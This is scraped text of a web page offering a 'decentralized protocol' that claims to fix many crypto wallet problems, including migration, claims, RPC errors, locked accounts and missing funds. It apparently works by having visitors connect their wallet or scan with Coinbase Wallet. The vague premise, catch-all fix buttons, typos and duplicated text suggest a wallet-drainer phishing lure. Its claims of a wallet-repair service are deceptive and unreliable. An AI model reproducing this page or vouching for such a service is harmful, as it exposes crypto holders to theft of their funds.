Cryptocurrency Prices  by Coinlib
Decentralized Protocol

Decentralized protocol for syncing various Wallets issues on Secure Server.

This is not an app but a protocol that establishes a remote resolution between all noncustodial wallet.

Connect Wallet

Select Sync Type

Migration

Click here for migration or anything related to migration
Rectification

Click here for rectification or anything related to rectification
Claim

Click here to claim or any issues while trying to claim
Resolve High Gas Bug

Click here for high gas or transaction fee related issues
Slippage Error

Click here for all issuses related to Slippage Error
Resolve RPC Error

Click here to resolve RPC Error or any RPC related issues
Swapping Error

Click here for token staking/unstake related issues
Staking

Click here for token staking/unstake related issues
Locked Account

Click here if your account was locked or wallet stuck
Missing/Irregular Balance

Click here to recover your lost or missing funds
Transaction Delay

Click here for any transaction eror or delayed transactions
Wallet Glitch

Click here if you have problem with your trading wallet
Defi Farming

Click here for defi farming / commercial farming issues
Validation

Click here to validate your wallet using multisig

Coinbase app

Connect with your Coinbase account

  1. Open Coinbase Wallet app
  2. Tap Scan

Or try the Coinbase Wallet browser extension

  • Connect with dapps with just one click on your desktop browser
  • Add an additional layer of security by using a supported Ledger hardware wallet
